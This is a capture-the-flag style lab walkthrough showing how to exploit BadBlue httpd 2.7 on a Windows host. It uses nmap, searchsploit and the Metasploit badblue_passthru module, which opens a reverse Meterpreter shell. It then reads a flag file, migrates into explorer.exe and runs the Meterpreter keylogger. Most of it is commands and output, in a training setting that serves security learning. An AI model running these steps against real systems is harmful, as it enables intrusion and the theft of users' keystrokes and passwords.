File and Keylogging using metasploit
====================================

#### 1. Scan running service

```
root@attackdefense:~# nmap 10.0.0.195
Starting Nmap 7.70 ( https://nmap.org ) at 2020-09-29 19:14 IST
Nmap scan report for ip-10-0-0-195.ap-southeast-1.compute.internal (10.0.0.195)
Host is up (0.0028s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
```
#### 2. Scan

```
root@attackdefense:~# nmap -sV -p80 10.0.0.195
Starting Nmap 7.70 ( https://nmap.org ) at 2020-09-29 19:16 IST
Nmap scan report for ip-10-0-0-195.ap-southeast-1.compute.internal (10.0.0.195)
Host is up (0.0029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.85 seconds
root@attackdefense:~#
```

#### 3. Search exploit for BadBlue

```
root@attackdefense:~# searchsploit badblue 2.7
---------------------------------------------------------- ----------------------------------------
 Exploit Title                                            |  Path
                                                          | (/usr/share/exploitdb/)
---------------------------------------------------------- ----------------------------------------
BadBlue 2.72 - PassThru Remote Buffer Overflow            | exploits/windows/remote/4784.pl
BadBlue 2.72b - Multiple Vulnerabilities                  | exploits/windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)     | exploits/windows/remote/16806.rb
Working Resources BadBlue 1.2.7 - Denial of Service       | exploits/windows/dos/20641.txt
Working Resources BadBlue 1.2.7 - Full Path Disclosure    | exploits/windows/remote/20640.txt
---------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

#### 4. Use badblue_passthru exploit metasploit module
```
msf5 > use exploit/windows/http/badblue_passthru
msf5 exploit(windows/http/badblue_passthru) > set RHOST 10.0.0.195
RHOST => 10.0.0.195
msf5 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.1.2:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (180291 bytes) to 10.0.0.195
[*] Meterpreter session 1 opened (10.10.1.2:4444 -> 10.0.0.195:49227) at 2020-09-29 19:24:44 +0530

meterpreter >
```

#### 5. Use shell to access windows command prompt to get flag strings

```
meterpreter > shell
Process 2480 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\BadBlue\EE>cd /
cd /

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\

09/16/2020  09:01 AM                32 flag.txt
08/22/2013  03:52 PM    <DIR>          PerfLogs
08/12/2020  04:13 AM    <DIR>          Program Files
09/11/2020  08:17 AM    <DIR>          Program Files (x86)
09/10/2020  09:50 AM    <DIR>          Users
09/11/2020  08:18 AM    <DIR>          Windows
               1 File(s)             32 bytes
               5 Dir(s)   9,291,325,440 bytes free

C:\>type flag.txt
type flag.txt
70a569da306697d64fc6c19afea37d94
C:\>
```
#### 6. Exit from shell and show running process

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                           Path
 ---   ----  ----                  ----  -------  ----                           ----
 0     0     [System Process]                                                    
 4     0     System                x64   0                                       
 368   4     smss.exe              x64   0                                       
 480   696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 532   524   csrss.exe             x64   0                                       
 536   696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 600   592   csrss.exe             x64   1                                       
 608   524   wininit.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wininit.exe
 636   592   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM            C:\Windows\System32\winlogon.exe
 684   2376  csrss.exe             x64   3                                       
 696   608   services.exe          x64   0                                       
 704   608   lsass.exe             x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\lsass.exe
 764   696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 808   696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 884   696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 904   636   dwm.exe               x64   1        Window Manager\DWM-1           C:\Windows\System32\dwm.exe
 928   696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 940   696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 952   696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 1072  536   rdpclip.exe           x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\rdpclip.exe
 1108  2416  badblue.exe           x86   1        WIN-OMCNBKR66MN\Administrator  C:\Program Files (x86)\BadBlue\EE\badblue.exe
 1112  696   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\spoolsv.exe
 1140  696   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1184  696   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1208  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 1268  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 1356  696   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1596  2376  winlogon.exe          x64   3        NT AUTHORITY\SYSTEM            C:\Windows\System32\winlogon.exe
 1732  1108  iexplore.exe          x64   1        WIN-OMCNBKR66MN\Administrator  C:\Program Files\Internet Explorer\iexplore.exe
 1772  764   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\wbem\WmiPrvSE.exe
 2188  764   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wbem\WmiPrvSE.exe
  2356  928   taskhostex.exe        x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\taskhostex.exe
  2400  696   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\msdtc.exe
  2416  2396  explorer.exe          x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\explorer.exe
  2468  1596  LogonUI.exe           x64   3        NT AUTHORITY\SYSTEM            C:\Windows\System32\LogonUI.exe
  2740  1732  iexplore.exe          x86   1        WIN-OMCNBKR66MN\Administrator  C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
  2824  1596  dwm.exe               x64   3        Window Manager\DWM-3           C:\Windows\System32\dwm.exe
```

#### 7. Migrate to explorer.exe process on 2416

```
meterpreter > migrate 2416
[*] Migrating from 1108 to 2416...
[*] Migration completed successfully.
```

#### 8. Start keylogger

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter >
```

#### 9. Dump keylogger

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
<Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><CR>
hallo hacker<CR>
a<^H><Shift>### uucp

meterpreter >

```
